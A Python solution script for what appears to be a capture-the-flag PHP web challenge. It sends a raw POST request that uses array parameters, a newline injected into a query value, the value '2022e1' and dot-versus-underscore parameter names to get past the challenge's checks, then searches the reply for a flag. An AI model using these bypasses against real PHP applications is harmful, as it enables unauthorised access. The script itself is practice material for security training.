import socket, re, html as _html

host = '80-2005f10e-b861-4aa9-8f0c-bc279804f290.challenge.ctfplus.cn'

# Try sending BOTH SYC_GEEK.2023 and SYC_GEEK_2023
# And also try with query string param
body = (
    'qw[]=a&yxx[]=b'
    '&SYC_GEEK.2023=Happy+to+see+you%21'
    '&SYC_GEEK_2023=also_here'
)

# Also try: unicode dot vs regular dot
# body2 = '...SYC_GEEK\u002e2023=...'

req = (
    f'POST /?syc=Welcome+to+GEEK+2023%21%0a&lover=2022e1&debug=1 HTTP/1.1\r\n'
    f'Host: {host}\r\n'
    f'Content-Type: application/x-www-form-urlencoded\r\n'
    f'Content-Length: {len(body)}\r\n'
    f'User-Agent: Mozilla/5.0\r\n'
    f'Connection: close\r\n'
    f'\r\n'
    f'{body}'
).encode()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, 80))
s.sendall(req)
resp = b''
while True:
    chunk = s.recv(4096)
    if not chunk: break
    resp += chunk
s.close()

resp_str = resp.decode('utf-8', errors='replace')
header, _, body_text = resp_str.partition('\r\n\r\n')
clean = _html.unescape(re.sub(r'<[^>]+>', '', body_text))
idx = clean.find('?>')
text = clean[idx+2:].strip() if idx > 0 else clean[:200]

# Show full raw text after PHP code
print("=== Response after PHP code ===")
print(text.replace('\xa0',' ')[:500])

# Also check full body for flag
for pat in ['flag{', 'CTF{', 'ISCC{', 'Geesec{', 'GEEK{']:
    if pat in clean:
        i = clean.find(pat)
        end = clean.find('}', i)
        if end > i:
            print(f"\nFLAG FOUND: {clean[i:end+1]}")
